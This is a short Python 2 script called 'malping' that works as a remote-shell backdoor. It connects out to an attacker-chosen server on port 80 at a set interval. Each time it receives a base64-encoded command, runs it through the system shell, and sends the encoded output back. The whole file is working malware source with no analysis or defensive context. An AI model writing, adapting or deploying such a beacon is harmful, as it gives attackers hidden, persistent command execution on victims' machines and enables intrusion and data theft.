#!/usr/bin/env python

import sys
import time
import socket
import base64
import datetime
import subprocess

if len(sys.argv) != 3:
    print 'Usage: ./malping [mp_server ip] [delay time (s)]'
    sys.exit(1)
HOST = sys.argv[1]
try:
    DELAY = int(sys.argv[2])
except ValueError:
    print '[!] Error: Third parameter (delay time) must be an int.'
    sys.exit(1)
SIZE = 1024
PORT = 80

def main():
    print '[+] Malping started with delay of {} seconds. Ctrl-c to exit.'.format(DELAY)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((HOST, PORT))
                cmd = base64.b64decode(s.recv(SIZE))
                print '[+] ({}) Executing "{}"'.format(datetime.datetime.now(),
                                                       cmd)
                stdout = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                          shell=True).communicate()[0]
                response = base64.b64encode(stdout)
                s.send(response)
            except socket.error:
                print '[!] ({}) Could not connect to server. Waiting...'.format(datetime.datetime.now())
            finally:
                time.sleep(DELAY)
        except KeyboardInterrupt:
            print '[-] Malping terminated.'
            sys.exit(0)

if __name__ == '__main__':
    main()
